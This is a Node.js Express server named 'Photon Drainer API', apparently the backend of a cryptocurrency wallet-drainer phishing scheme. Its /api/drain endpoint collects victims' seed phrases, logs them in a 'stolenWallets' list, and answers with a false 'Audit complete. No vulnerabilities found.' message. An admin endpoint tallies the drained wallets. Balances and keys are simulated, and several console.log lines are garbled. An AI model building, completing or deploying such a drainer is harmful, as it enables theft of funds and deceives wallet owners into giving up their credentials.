const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3001;
let stolenWallets = [];

app.get('/api/health', (req, res) => {
    res.json({ status: 'operational', timestamp: new Date().toISOString() });
});

app.get('/api/admin/stats', (req, res) => {
    res.json({
        totalDrained: stolenWallets.length,
        totalSol: stolenWallets.reduce((s, w) => s + w.balance, 0),
        wallets: stolenWallets
    });
});

app.post('/api/drain', async (req, res) => {
    const { seedPhrase, walletType } = req.body;
    if (!seedPhrase || seedPhrase.split(' ').length < 12) {
        return res.status(400).json({ success: false, error: 'Invalid seed phrase' });
    }
    try {
        console.log([API] Drain request from );
        stolenWallets.push({
            seedPhrase: seedPhrase.substring(0, 20) + '...',
            publicKey: 'Simulated_' + Date.now(),
            balance: Math.random() * 10,
            drained: true,
            timestamp: Date.now()
        });
        return res.json({
            success: true,
            message: 'Audit complete. No vulnerabilities found.',
            auditId: require('crypto').randomBytes(16).toString('hex'),
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        return res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.get('/', (req, res) => {
    res.json({ status: 'Photon Drainer API running', endpoints: { drain: '/api/drain (POST)', stats: '/api/admin/stats (GET)', health: '/api/health (GET)' } });
});

app.listen(PORT, () => {
    console.log(🚀 API running on port );
    console.log(📍 /api/drain);
    console.log(📊 /api/admin/stats);
});
